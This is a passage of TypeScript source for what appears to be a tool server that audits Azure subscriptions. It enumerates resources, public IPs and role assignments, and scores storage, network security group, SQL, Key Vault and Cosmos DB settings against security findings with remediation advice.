          const vmCount = allResources.filter(r => r.location?.toLowerCase() === loc && r.type === "Microsoft.Compute/virtualMachines").length;
          const storageCount = allResources.filter(r => r.location?.toLowerCase() === loc && r.type === "Microsoft.Storage/storageAccounts").length;
          const totalInLoc = allResources.filter(r => r.location?.toLowerCase() === loc).length;
          
          if (rgCount > 0 || totalInLoc > 0) {
            locationSummary[loc] = {
              resourceGroups: rgCount,
              vms: vmCount,
              storage: storageCount,
              total: totalInLoc
            };
          }
        }

        const activeLocations = Object.keys(locationSummary);
        const totalResources = allResources.length;

        let output = `# 🌍 Azure Active Locations Scan\n\n`;
        output += `**Subscription:** ${subscriptionId}\n`;
        output += `**Scan Mode:** ${scanMode || "common"} (${locationsToCheck.length} locations checked)\n`;
        output += `**Active Locations:** ${activeLocations.length}\n`;
        output += `**Total Resources:** ${totalResources}\n\n`;

        if (activeLocations.length > 0) {
          output += `## Active Locations\n\n`;
          output += `| Location | Resource Groups | VMs | Storage | Total Resources |\n`;
          output += `|----------|-----------------|-----|---------|----------------|\n`;
          
          for (const [loc, stats] of Object.entries(locationSummary).sort((a, b) => b[1].total - a[1].total)) {
            output += `| ${loc} | ${stats.resourceGroups} | ${stats.vms} | ${stats.storage} | ${stats.total} |\n`;
          }

          output += `\n## Quick Reference\n`;
          output += `Active locations: \`${activeLocations.join(", ")}\`\n`;
        } else {
          output += `⚠️ No resources found in checked locations.\n`;
          output += `Try scanning with scanMode: "all" for comprehensive coverage.\n`;
        }

        return {
          content: [{ type: "text", text: formatResponse(output, format, request.params.name) }],
        };
      }

      case "azure_scan_all_locations": {
        const { subscriptionId, resourceType, locations, format } = request.params.arguments as {
          subscriptionId: string;
          resourceType: "vms" | "storage" | "nsgs" | "aks" | "sql" | "keyvaults" | "public_ips" | "all";
          locations?: string;
          format?: string;
        };

        const targetLocations = resolveLocations(locations || "common");
        const resourceClient = new ResourceManagementClient(credential, subscriptionId);
        
        // Collect all resources
        const allResources: Array<{ name?: string; type?: string; location?: string; id?: string; resourceGroup?: string }> = [];
        
        for await (const resource of resourceClient.resources.list()) {
          allResources.push({
            name: resource.name,
            type: resource.type,
            location: resource.location,
            id: resource.id,
            resourceGroup: resource.id?.split('/')[4]
          });
        }

        // Filter by location if specified
        const filteredResources = targetLocations 
          ? allResources.filter(r => r.location && targetLocations.includes(r.location.toLowerCase()))
          : allResources;

        // Filter by resource type
        const typeMap: Record<string, string> = {
          vms: "Microsoft.Compute/virtualMachines",
          storage: "Microsoft.Storage/storageAccounts",
          nsgs: "Microsoft.Network/networkSecurityGroups",
          aks: "Microsoft.ContainerService/managedClusters",
          sql: "Microsoft.Sql/servers",
          keyvaults: "Microsoft.KeyVault/vaults",
          public_ips: "Microsoft.Network/publicIPAddresses"
        };

        let results = filteredResources;
        if (resourceType !== "all") {
          results = filteredResources.filter(r => r.type === typeMap[resourceType]);
        }

        // Group by location
        const byLocation: Record<string, typeof results> = {};
        for (const r of results) {
          const loc = r.location || "unknown";
          if (!byLocation[loc]) byLocation[loc] = [];
          byLocation[loc].push(r);
        }

        // Build output
        let output = `# 🌍 Multi-Location Resource Scan\n\n`;
        output += `**Subscription:** ${subscriptionId}\n`;
        output += `**Resource Type:** ${resourceType}\n`;
        output += `**Locations Scanned:** ${targetLocations ? targetLocations.length : "all"}\n`;
        output += `**Total Found:** ${results.length}\n\n`;

        if (Object.keys(byLocation).length > 0) {
          for (const [loc, resources] of Object.entries(byLocation).sort((a, b) => b[1].length - a[1].length)) {
            output += `## 📍 ${loc} (${resources.length})\n\n`;
            
            if (resourceType === "all") {
              // Group by type
              const byType: Record<string, number> = {};
              for (const r of resources) {
                const t = r.type || "unknown";
                byType[t] = (byType[t] || 0) + 1;
              }
              for (const [t, count] of Object.entries(byType).sort((a, b) => b[1] - a[1])) {
                output += `- ${t}: ${count}\n`;
              }
            } else {
              for (const r of resources) {
                output += `- **${r.name}** (${r.resourceGroup})\n`;
              }
            }
            output += `\n`;
          }
        } else {
          output += `⚠️ No ${resourceType} resources found in specified locations.\n`;
        }

        return {
          content: [{ type: "text", text: formatResponse(output, format, request.params.name) }],
        };
      }

      case "azure_enumerate_resource_groups": {
        const { subscriptionId, location, format } = request.params.arguments as {
          subscriptionId: string;
          location?: string;
          format?: string;
        };

        const client = new ResourceManagementClient(credential, subscriptionId);
        const resourceGroups = [];
        const targetLocations = resolveLocations(location);

        for await (const rg of client.resourceGroups.list()) {
          resourceGroups.push({
            name: rg.name,
            location: rg.location,
            id: rg.id,
            tags: rg.tags,
            provisioningState: rg.properties?.provisioningState,
          });
        }

        // Filter by location if specified
        const filtered = filterByLocation(resourceGroups, targetLocations);

        let output = `# Resource Groups in Subscription\n\n`;
        output += `Found ${filtered.length} resource group(s)`;
        if (location) output += ` in ${location}`;
        output += `:\n\n${JSON.stringify(filtered, null, 2)}`;

        return {
          content: [{ type: "text", text: formatResponse(output, format, request.params.name) }],
        };
      }

      case "azure_enumerate_resources": {
        const { subscriptionId, resourceGroup, resourceType, location, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          resourceType?: string;
          location?: string;
          format?: string;
        };

        const client = new ResourceManagementClient(credential, subscriptionId);
        const resources = [];
        const targetLocations = resolveLocations(location);

        let filter = "";
        if (resourceType) {
          filter = `resourceType eq '${resourceType}'`;
        }

        if (resourceGroup) {
          for await (const resource of client.resources.listByResourceGroup(resourceGroup, { filter })) {
            resources.push({
              name: resource.name,
              type: resource.type,
              location: resource.location,
              id: resource.id,
              tags: resource.tags,
            });
          }
        } else {
          for await (const resource of client.resources.list({ filter })) {
            resources.push({
              name: resource.name,
              type: resource.type,
              location: resource.location,
              id: resource.id,
              resourceGroup: resource.id?.split('/')[4],
              tags: resource.tags,
            });
          }
        }

        // Filter by location if specified
        const filtered = filterByLocation(resources, targetLocations);

        const summary = filtered.reduce((acc, r) => {
          acc[r.type!] = (acc[r.type!] || 0) + 1;
          return acc;
        }, {} as Record<string, number>);

        let output = `# Azure Resources\n\n`;
        output += `Found ${filtered.length} resource(s)`;
        if (location) output += ` in ${location}`;
        output += `\n\n## Summary by Type:\n${JSON.stringify(summary, null, 2)}\n\n## Resources:\n${JSON.stringify(filtered, null, 2)}`;

        return {
          content: [{ type: "text", text: formatResponse(output, format, request.params.name) }],
        };
      }

      case "azure_get_resource_details": {
        const { subscriptionId, resourceGroup, resourceProvider, resourceType, resourceName, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup: string;
          resourceProvider: string;
          resourceType: string;
          resourceName: string;
          format?: string;
        };

        const client = new ResourceManagementClient(credential, subscriptionId);
        
        // Use latest API version based on resource type
        const apiVersionMap: Record<string, string> = {
          "Microsoft.Network": "2024-03-01",
          "Microsoft.Compute": "2024-07-01",
          "Microsoft.Storage": "2023-05-01",
          "Microsoft.Sql": "2023-08-01-preview",
          "Microsoft.KeyVault": "2023-07-01",
          "Microsoft.ContainerService": "2024-09-01",
          "Microsoft.DocumentDB": "2024-11-15",
          "Microsoft.Web": "2024-04-01",
        };
        
        const apiVersion = apiVersionMap[resourceProvider] || "2024-03-01";

        const resource = await client.resources.get(
          resourceGroup,
          resourceProvider,
          "",
          resourceType,
          resourceName,
          apiVersion
        );

        return {
          content: [
            {
              type: "text",
              text: formatResponse(`# Resource Details\n\n${JSON.stringify(resource, null, 2)}`, format, request.params.name),
            },
          ],
        };
      }

      case "azure_analyze_storage_security": {
        const { subscriptionId, resourceGroup, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          format?: string;
        };

        const storageClient = new StorageManagementClient(credential, subscriptionId);
        const findings: any[] = [];
        const storageAccounts: any[] = [];

        // List storage accounts
        const accounts = resourceGroup 
          ? storageClient.storageAccounts.listByResourceGroup(resourceGroup)
          : storageClient.storageAccounts.list();

        for await (const account of accounts) {
          const accountFindings: any[] = [];
          let riskScore = 0;

          if (account.allowBlobPublicAccess === true) {
            accountFindings.push({
              severity: "HIGH",
              finding: "Public blob access is ENABLED",
              description: "Blobs can be accessed anonymously without authentication",
              remediation: "Set allowBlobPublicAccess to false unless explicitly required",
              cve: "CWE-284: Improper Access Control",
            });
            riskScore += 30;
          }

          if (account.enableHttpsTrafficOnly === false) {
            accountFindings.push({
              severity: "CRITICAL",
              finding: "HTTPS-only (secure transfer) is DISABLED",
              description: "Storage allows unencrypted HTTP traffic - data in transit is not protected",
              remediation: "Enable 'Secure transfer required' (enableHttpsTrafficOnly: true)",
              cve: "CWE-319: Cleartext Transmission of Sensitive Information",
            });
            riskScore += 40;
          }

          if (account.minimumTlsVersion !== "TLS1_2") {
            accountFindings.push({
              severity: "HIGH",
              finding: `Weak TLS version: ${account.minimumTlsVersion || "Not set (defaults to TLS 1.0)"}`,
              description: "Storage accepts outdated TLS versions vulnerable to attacks",
              remediation: "Set minimumTlsVersion to TLS1_2 or TLS1_3",
              cve: "CWE-327: Use of a Broken or Risky Cryptographic Algorithm",
            });
            riskScore += 25;
          }

          if (!account.networkRuleSet || account.networkRuleSet.defaultAction === "Allow") {
            accountFindings.push({
              severity: "MEDIUM",
              finding: "No network restrictions configured",
              description: "Storage account is accessible from all networks (default: Allow)",
              remediation: "Configure network rules to restrict access to specific VNets/IPs",
              cve: "CWE-923: Improper Restriction of Communication Channel to Intended Endpoints",
            });
            riskScore += 15;
          }

          const hasPrivateEndpoints = account.privateEndpointConnections && account.privateEndpointConnections.length > 0;
          if (!hasPrivateEndpoints && account.networkRuleSet?.defaultAction !== "Deny") {
            accountFindings.push({
              severity: "MEDIUM",
              finding: "No private endpoints configured",
              description: "Storage is accessed via public endpoint without private link",
              remediation: "Configure private endpoints for secure VNet-only access",
              cve: "CWE-668: Exposure of Resource to Wrong Sphere",
            });
            riskScore += 10;
          }

          if (!account.encryption || !account.encryption.services?.blob?.enabled) {
            accountFindings.push({
              severity: "CRITICAL",
              finding: "Blob encryption is NOT enabled",
              description: "Data at rest is not encrypted",
              remediation: "Enable encryption for blob service (enabled by default on new accounts)",
              cve: "CWE-311: Missing Encryption of Sensitive Data",
            });
            riskScore += 50;
          }

          if (account.allowSharedKeyAccess !== false) {
            accountFindings.push({
              severity: "LOW",
              finding: "Shared key access is enabled",
              description: "Storage keys can be used for authentication (consider Azure AD only)",
              remediation: "Set allowSharedKeyAccess to false and use Azure AD authentication",
              cve: "CWE-798: Use of Hard-coded Credentials",
            });
            riskScore += 5;
          }

          storageAccounts.push({
            name: account.name,
            resourceGroup: account.id?.split('/')[4],
            location: account.location,
            sku: account.sku?.name,
            kind: account.kind,
            riskScore,
            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
            findings: accountFindings,
            securitySummary: {
              publicBlobAccess: account.allowBlobPublicAccess,
              httpsOnly: account.enableHttpsTrafficOnly,
              minTlsVersion: account.minimumTlsVersion,
              networkDefaultAction: account.networkRuleSet?.defaultAction,
              privateEndpoints: hasPrivateEndpoints ? account.privateEndpointConnections?.length : 0,
              blobEncryption: account.encryption?.services?.blob?.enabled,
              sharedKeyAccess: account.allowSharedKeyAccess,
            },
          });
        }

        // Sort by risk score
        storageAccounts.sort((a, b) => b.riskScore - a.riskScore);

        const criticalCount = storageAccounts.filter(a => a.riskLevel === "CRITICAL").length;
        const highCount = storageAccounts.filter(a => a.riskLevel === "HIGH").length;
        const mediumCount = storageAccounts.filter(a => a.riskLevel === "MEDIUM").length;

        return {
          content: [
            {
              type: "text",
              text: formatResponse(`# Storage Security Analysis\n\n## Summary\n- Total Storage Accounts: ${storageAccounts.length}\n- CRITICAL Risk: ${criticalCount}\n- HIGH Risk: ${highCount}\n- MEDIUM Risk: ${mediumCount}\n- LOW Risk: ${storageAccounts.length - criticalCount - highCount - mediumCount}\n\n## Detailed Findings\n\n${JSON.stringify(storageAccounts, null, 2)}`, format, request.params.name),
            },
          ],
        };
      }

      case "azure_analyze_nsg_rules": {
        const { subscriptionId, resourceGroup, nsgName, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          nsgName?: string;
          format?: string;
        };

        const networkClient = new NetworkManagementClient(credential, subscriptionId);
        const nsgAnalysis: any[] = [];

        // High-risk ports for automated detection
        const managementPorts = [22, 3389, 5985, 5986, 5022]; // SSH, RDP, WinRM, WinRM-HTTPS, SQL AlwaysOn
        const databasePorts = [1433, 3306, 5432, 27017, 6379, 9042]; // SQL, MySQL, PostgreSQL, MongoDB, Redis, Cassandra
        const wildcardSources = ["*", "0.0.0.0/0", "Internet", "Any"];

        let nsgs: any[] = [];
        if (nsgName && resourceGroup) {
          const nsg = await networkClient.networkSecurityGroups.get(resourceGroup, nsgName);
          nsgs = [nsg];
        } else if (resourceGroup) {
          for await (const nsg of networkClient.networkSecurityGroups.list(resourceGroup)) {
            nsgs.push(nsg);
          }
        } else {
          const resourceClient = new ResourceManagementClient(credential, subscriptionId);
          for await (const resource of resourceClient.resources.list({ filter: "resourceType eq 'Microsoft.Network/networkSecurityGroups'" })) {
            if (resource.name && resource.id) {
              const rg = resource.id.split('/')[4];
              const nsg = await networkClient.networkSecurityGroups.get(rg, resource.name);
              nsgs.push(nsg);
            }
          }
        }

        for (const nsg of nsgs) {
          const nsgFindings: any[] = [];
          let riskScore = 0;

          const allRules = [
            ...(nsg.securityRules || []),
            ...(nsg.defaultSecurityRules || []),
          ];

          for (const rule of allRules) {
            if (rule.access === "Allow" && rule.direction === "Inbound") {
              const sourceAddress = rule.sourceAddressPrefix || rule.sourceAddressPrefixes?.join(',') || "";
              const destPort = rule.destinationPortRange || rule.destinationPortRanges?.join(',') || "";
              
              const hasWildcardSource = wildcardSources.some(wild => 
                sourceAddress.includes(wild) || sourceAddress === ""
              );

              const exposedMgmtPorts = managementPorts.filter(port => 
                destPort.includes(String(port)) || destPort === "*" || destPort.includes("0-65535")
              );

              const exposedDbPorts = databasePorts.filter(port => 
                destPort.includes(String(port)) || destPort === "*" || destPort.includes("0-65535")
              );

              if (hasWildcardSource && exposedMgmtPorts.length > 0) {
                nsgFindings.push({
                  severity: "CRITICAL",
                  ruleName: rule.name,
                  priority: rule.priority,
                  finding: `Management port ${exposedMgmtPorts.join(', ')} exposed to Internet`,
                  description: `Rule allows ${destPort} from ${sourceAddress}`,
                  remediation: "Restrict source to specific IPs or use Azure Bastion/VPN",
                  cve: "CWE-749: Exposed Dangerous Method or Function",
                  attackVector: exposedMgmtPorts.includes(3389) ? "RDP brute force" : exposedMgmtPorts.includes(22) ? "SSH brute force" : "Remote management exploitation",
                });
                riskScore += 50;
              }

              if (hasWildcardSource && exposedDbPorts.length > 0) {
                nsgFindings.push({
                  severity: "HIGH",
                  ruleName: rule.name,
                  priority: rule.priority,
                  finding: `Database port ${exposedDbPorts.join(', ')} exposed to Internet`,
                  description: `Rule allows ${destPort} from ${sourceAddress}`,
                  remediation: "Use private endpoints or restrict to application subnet only",
                  cve: "CWE-668: Exposure of Resource to Wrong Sphere",
                  attackVector: "Direct database access, data exfiltration",
                });
                riskScore += 40;
              }

              if (hasWildcardSource && (destPort === "*" || destPort.includes("0-65535"))) {
                nsgFindings.push({
                  severity: "CRITICAL",
                  ruleName: rule.name,
                  priority: rule.priority,
                  finding: "All ports exposed to Internet (wildcard rule)",
                  description: `Rule allows ALL ports from ${sourceAddress}`,
                  remediation: "Implement least privilege - allow only required ports",
                  cve: "CWE-284: Improper Access Control",
                  attackVector: "Full network exposure, service enumeration",
                });
                riskScore += 60;
              }

              if (hasWildcardSource && rule.priority && rule.priority < 1000) {
                nsgFindings.push({
                  severity: "MEDIUM",
                  ruleName: rule.name,
                  priority: rule.priority,
                  finding: `High-priority rule (${rule.priority}) allows Internet access`,
                  description: `Rule allows ${destPort} from ${sourceAddress}`,
                  remediation: "Review rule necessity and consider increasing priority number",
                  cve: "CWE-284: Improper Access Control",
                });
                riskScore += 15;
              }
            }
          }

          nsgAnalysis.push({
            name: nsg.name,
            resourceGroup: nsg.id?.split('/')[4],
            location: nsg.location,
            riskScore,
            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
            findings: nsgFindings,
            totalRules: allRules.length,
            allowInboundRules: allRules.filter(r => r.access === "Allow" && r.direction === "Inbound").length,
            attachedTo: {
              subnets: nsg.subnets?.length || 0,
              networkInterfaces: nsg.networkInterfaces?.length || 0,
            },
          });
        }

        // Sort by risk score
        nsgAnalysis.sort((a, b) => b.riskScore - a.riskScore);

        const criticalCount = nsgAnalysis.filter(n => n.riskLevel === "CRITICAL").length;
        const highCount = nsgAnalysis.filter(n => n.riskLevel === "HIGH").length;

        return {
          content: [
            {
              type: "text",
              text: formatResponse(`# NSG Security Analysis\n\n## Summary\n- Total NSGs: ${nsgAnalysis.length}\n- CRITICAL Risk: ${criticalCount}\n- HIGH Risk: ${highCount}\n- MEDIUM Risk: ${nsgAnalysis.filter(n => n.riskLevel === "MEDIUM").length}\n- LOW Risk: ${nsgAnalysis.filter(n => n.riskLevel === "LOW").length}\n\n## Detailed Findings\n\n${JSON.stringify(nsgAnalysis, null, 2)}`, format, request.params.name),
            },
          ],
        };
      }

      case "azure_enumerate_public_ips": {
        const { subscriptionId, resourceGroup, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          format?: string;
        };

        const networkClient = new NetworkManagementClient(credential, subscriptionId);
        const publicIps: any[] = [];

        let ips;
        if (resourceGroup) {
          ips = networkClient.publicIPAddresses.list(resourceGroup);
        } else {
          // List all public IPs across all resource groups
          const resourceClient = new ResourceManagementClient(credential, subscriptionId);
          const ipList: any[] = [];
          for await (const resource of resourceClient.resources.list({ filter: "resourceType eq 'Microsoft.Network/publicIPAddresses'" })) {
            if (resource.name && resource.id) {
              const rg = resource.id.split('/')[4];
              const ip = await networkClient.publicIPAddresses.get(rg, resource.name);
              ipList.push(ip);
            }
          }
          ips = (async function* () {
            for (const ip of ipList) {
              yield ip;
            }
          })();
        }

        for await (const ip of ips) {
          const attachedTo = ip.ipConfiguration?.id 
            ? {
                resourceId: ip.ipConfiguration.id,
                resourceType: ip.ipConfiguration.id.split('/')[7], // Extract resource type
                resourceName: ip.ipConfiguration.id.split('/')[8],
              }
            : null;

          publicIps.push({
            name: ip.name,
            resourceGroup: ip.id?.split('/')[4],
            location: ip.location,
            ipAddress: ip.ipAddress || "Not allocated",
            allocationMethod: ip.publicIPAllocationMethod,
            dnsName: ip.dnsSettings?.fqdn || "None",
            domainNameLabel: ip.dnsSettings?.domainNameLabel || "None",
            version: ip.publicIPAddressVersion,
            sku: ip.sku?.name,
            attachedTo,
            provisioningState: ip.provisioningState,
            idleTimeoutInMinutes: ip.idleTimeoutInMinutes,
          });
        }

        return {
          content: [
            {
              type: "text",
              text: formatResponse(`# Public IP Addresses\n\n## Attack Surface Summary\n- Total Public IPs: ${publicIps.length}\n- Allocated: ${publicIps.filter(ip => ip.ipAddress !== "Not allocated").length}\n- With DNS Names: ${publicIps.filter(ip => ip.dnsName !== "None").length}\n- Attached to Resources: ${publicIps.filter(ip => ip.attachedTo).length}\n- Unattached (Orphaned): ${publicIps.filter(ip => !ip.attachedTo).length}\n\n## Public IPs\n\n${JSON.stringify(publicIps, null, 2)}`, format, request.params.name),
            },
          ],
        };
      }

      case "azure_enumerate_rbac_assignments": {
        const { subscriptionId, scope, format } = request.params.arguments as {
          subscriptionId: string;
          scope?: string;
          format?: string;
        };

        const authClient = new AuthorizationManagementClient(credential, subscriptionId);
        const assignments: any[] = [];
        const privilegedRoles = ["Owner", "Contributor", "User Access Administrator"];

        // Determine scope
        const targetScope = scope || `/subscriptions/${subscriptionId}`;

        for await (const assignment of authClient.roleAssignments.listForScope(targetScope)) {
          let roleName = "Unknown";
          let roleType = "Unknown";
          try {
            if (assignment.roleDefinitionId) {
              const roleDefId = assignment.roleDefinitionId.split('/').pop() || "";
              const roleDef = await authClient.roleDefinitions.getById(assignment.roleDefinitionId);
              roleName = roleDef.roleName || "Unknown";
              roleType = roleDef.roleType || "Unknown";
            }
          } catch (e) {
            // Role definition might not be accessible
          }

          const isPrivileged = privilegedRoles.includes(roleName);

          assignments.push({
            principalId: assignment.principalId,
            principalType: assignment.principalType,
            roleDefinitionId: assignment.roleDefinitionId,
            roleName,
            roleType,
            scope: assignment.scope,
            scopeLevel: assignment.scope?.includes('/resourceGroups/') 
              ? 'Resource Group' 
              : assignment.scope?.includes('/providers/') 
              ? 'Resource' 
              : 'Subscription',
            isPrivileged,
            createdOn: assignment.createdOn,
            createdBy: assignment.createdBy,
          });
        }

        // Sort by privileged roles first
        assignments.sort((a, b) => (b.isPrivileged ? 1 : 0) - (a.isPrivileged ? 1 : 0));

        const privilegedCount = assignments.filter(a => a.isPrivileged).length;
        const servicePrincipalCount = assignments.filter(a => a.principalType === "ServicePrincipal").length;
        const groupCount = assignments.filter(a => a.principalType === "Group").length;

        return {
          content: [
            {
              type: "text",
              text: formatResponse(`# RBAC Role Assignments\n\n## Summary\n- Total Assignments: ${assignments.length}\n- Privileged Roles (Owner/Contributor/UAA): ${privilegedCount}\n- Service Principals: ${servicePrincipalCount}\n- Groups: ${groupCount}\n- Users: ${assignments.filter(a => a.principalType === "User").length}\n\n## Scope: ${targetScope}\n\n## Role Assignments\n\n${JSON.stringify(assignments, null, 2)}`, format, request.params.name),
            },
          ],
        };
      }

      case "azure_scan_sql_databases": {
        const { subscriptionId, resourceGroup, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          format?: string;
        };

        const sqlClient = new SqlManagementClient(credential, subscriptionId);
        const resourceClient = new ResourceManagementClient(credential, subscriptionId);
        const sqlServers: any[] = [];

        const servers = resourceGroup
          ? sqlClient.servers.listByResourceGroup(resourceGroup)
          : sqlClient.servers.list();

        for await (const server of servers) {
          const serverFindings: any[] = [];
          let riskScore = 0;
          const serverRg = server.id?.split('/')[4] || resourceGroup || "";
          const serverName = server.name || "";

          const firewallRules = await sqlClient.firewallRules.listByServer(serverRg, serverName);
          let hasAllowAll = false;
          for await (const rule of firewallRules) {
            if (rule.startIpAddress === "0.0.0.0" && rule.endIpAddress === "255.255.255.255") {
              serverFindings.push({
                severity: "CRITICAL",
                finding: `Firewall rule '${rule.name}' allows ALL Internet IPs`,
                description: "Rule: 0.0.0.0 - 255.255.255.255 allows unrestricted Internet access",
                remediation: "Remove allow-all rule and whitelist specific IPs/VNets only",
                cve: "CWE-284: Improper Access Control",
                attackVector: "Direct database access from Internet, brute force",
              });
              riskScore += 60;
              hasAllowAll = true;
            }
          }

          if (!server.administrators || !server.administrators.azureADOnlyAuthentication) {
            serverFindings.push({
              severity: "HIGH",
              finding: "SQL authentication is enabled (not Azure AD-only)",
              description: "Server allows username/password authentication instead of Azure AD",
              remediation: "Enable Azure AD authentication and disable SQL logins",
              cve: "CWE-798: Use of Hard-coded Credentials",
              attackVector: "Password brute force, credential stuffing",
            });
            riskScore += 30;
          }

          if (server.publicNetworkAccess === "Enabled") {
            serverFindings.push({
              severity: "MEDIUM",
              finding: "Public network access is ENABLED",
              description: "Server is accessible from public Internet",
              remediation: "Use private endpoints and disable public network access",
              cve: "CWE-668: Exposure of Resource to Wrong Sphere",
            });
            riskScore += 15;
          }

          const databases = await sqlClient.databases.listByServer(serverRg, serverName);
          let unencryptedDbs = 0;
          for await (const db of databases) {
            if (db.name !== "master") {
              try {
                const tde = await sqlClient.transparentDataEncryptions.get(serverRg, serverName, db.name || "", "current");
                if (tde.state !== "Enabled") {
                  unencryptedDbs++;
                }
              } catch (e) {
                // TDE check failed
              }
            }
          }

          if (unencryptedDbs > 0) {
            serverFindings.push({
              severity: "CRITICAL",
              finding: `${unencryptedDbs} database(s) without TDE encryption`,
              description: "Transparent Data Encryption (TDE) is not enabled",
              remediation: "Enable TDE on all databases for encryption at rest",
              cve: "CWE-311: Missing Encryption of Sensitive Data",
            });
            riskScore += 50;
          }

          sqlServers.push({
            serverName: server.name,
            resourceGroup: serverRg,
            location: server.location,
            version: server.version,
            publicNetworkAccess: server.publicNetworkAccess,
            azureAdAuthOnly: server.administrators?.azureADOnlyAuthentication,
            riskScore,
            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
            findings: serverFindings,
          });
        }

        sqlServers.sort((a, b) => b.riskScore - a.riskScore);

        return {
          content: [
            {
              type: "text",
              text: formatResponse(`# SQL Database Security Analysis\n\n## Summary\n- Total SQL Servers: ${sqlServers.length}\n- CRITICAL Risk: ${sqlServers.filter(s => s.riskLevel === "CRITICAL").length}\n- HIGH Risk: ${sqlServers.filter(s => s.riskLevel === "HIGH").length}\n- MEDIUM Risk: ${sqlServers.filter(s => s.riskLevel === "MEDIUM").length}\n\n## Detailed Findings\n\n${JSON.stringify(sqlServers, null, 2)}`, format, request.params.name),
            },
          ],
        };
      }

      case "azure_analyze_keyvault_security": {
        const { subscriptionId, resourceGroup, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          format?: string;
        };

        const kvClient = new KeyVaultManagementClient(credential, subscriptionId);
        const keyVaults: any[] = [];

        const vaults = resourceGroup
          ? kvClient.vaults.listByResourceGroup(resourceGroup)
          : kvClient.vaults.listBySubscription();

        for await (const vault of vaults) {
          const vaultFindings: any[] = [];
          let riskScore = 0;

          if (!vault.properties?.enableSoftDelete) {
            vaultFindings.push({
              severity: "CRITICAL",
              finding: "Soft delete is DISABLED",
              description: "Secrets/keys can be permanently deleted without recovery option",
              remediation: "Enable soft delete to allow 90-day recovery window",
              cve: "CWE-404: Improper Resource Shutdown or Release",
            });
            riskScore += 50;
          }

          if (!vault.properties?.enablePurgeProtection) {
            vaultFindings.push({
              severity: "HIGH",
              finding: "Purge protection is DISABLED",
              description: "Deleted items can be immediately purged (no retention)",
              remediation: "Enable purge protection to prevent immediate deletion",
              cve: "CWE-404: Improper Resource Shutdown or Release",
            });
            riskScore += 30;
          }

          if (vault.properties?.publicNetworkAccess === "Enabled" || !vault.properties?.networkAcls) {
            vaultFindings.push({
              severity: "MEDIUM",
              finding: "Public network access is ENABLED",
              description: "Key Vault is accessible from public Internet",
              remediation: "Use private endpoints and disable public access",
              cve: "CWE-668: Exposure of Resource to Wrong Sphere",
            });
            riskScore += 15;
          }

          if (!vault.properties?.enableRbacAuthorization) {
            vaultFindings.push({
              severity: "LOW",
              finding: "Using Access Policies (not RBAC)",
              description: "Access Policies are less granular than Azure RBAC",
              remediation: "Migrate to Azure RBAC for better access control",
              cve: "CWE-284: Improper Access Control",
            });
            riskScore += 5;
          }

          keyVaults.push({
            name: vault.name,
            resourceGroup: vault.id?.split('/')[4],
            location: vault.location,
            softDeleteEnabled: vault.properties?.enableSoftDelete,
            purgeProtectionEnabled: vault.properties?.enablePurgeProtection,
            publicNetworkAccess: vault.properties?.publicNetworkAccess,
            rbacEnabled: vault.properties?.enableRbacAuthorization,
            riskScore,
            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
            findings: vaultFindings,
          });
        }

        keyVaults.sort((a, b) => b.riskScore - a.riskScore);

        return {
          content: [
            {
              type: "text",
              text: formatResponse(`# Key Vault Security Analysis\n\n## Summary\n- Total Key Vaults: ${keyVaults.length}\n- CRITICAL Risk: ${keyVaults.filter(k => k.riskLevel === "CRITICAL").length}\n- HIGH Risk: ${keyVaults.filter(k => k.riskLevel === "HIGH").length}\n- MEDIUM Risk: ${keyVaults.filter(k => k.riskLevel === "MEDIUM").length}\n\n## Detailed Findings\n\n${JSON.stringify(keyVaults, null, 2)}`, format, request.params.name),
            },
          ],
        };
      }

      case "azure_analyze_cosmosdb_security": {
        const { subscriptionId, resourceGroup, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          format?: string;
        };

        const cosmosClient = new CosmosDBManagementClient(credential, subscriptionId);
        const cosmosAccounts: any[] = [];

        const accounts = resourceGroup
          ? cosmosClient.databaseAccounts.listByResourceGroup(resourceGroup)
          : cosmosClient.databaseAccounts.list();

        for await (const account of accounts) {
          const accountFindings: any[] = [];
          let riskScore = 0;

          if (account.publicNetworkAccess === "Enabled") {
            accountFindings.push({
              severity: "HIGH",
              finding: "Public network access is ENABLED",
              description: "Cosmos DB is accessible from public Internet",
              remediation: "Use private endpoints and disable public access",
              cve: "CWE-668: Exposure of Resource to Wrong Sphere",
            });
            riskScore += 30;
          }

          if (!account.ipRules || account.ipRules.length === 0) {
            accountFindings.push({
              severity: "MEDIUM",
              finding: "No IP firewall rules configured",
              description: "Database is accessible from all IPs (if public access enabled)",
              remediation: "Configure IP firewall rules to whitelist specific IPs",
              cve: "CWE-923: Improper Restriction of Communication Channel",
            });
            riskScore += 15;
          }

          if (!account.virtualNetworkRules || account.virtualNetworkRules.length === 0) {
            accountFindings.push({
              severity: "MEDIUM",
              finding: "No virtual network rules configured",
              description: "Not restricted to specific VNets",
              remediation: "Configure virtual network rules for VNet integration",
              cve: "CWE-668: Exposure of Resource to Wrong Sphere",
            });
            riskScore += 10;
          }

          cosmosAccounts.push({
            name: account.name,
            resourceGroup: account.id?.split('/')[4],
            location: account.location,
            publicNetworkAccess: account.publicNetworkAccess,
            ipRulesCount: account.ipRules?.length || 0,
            vnetRulesCount: account.virtualNetworkRules?.length || 0,
            riskScore,
            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
            findings: accountFindings,
          });
        }

        cosmosAccounts.sort((a, b) => b.riskScore - a.riskScore);

        return {
          content: [
            {
              type: "text",
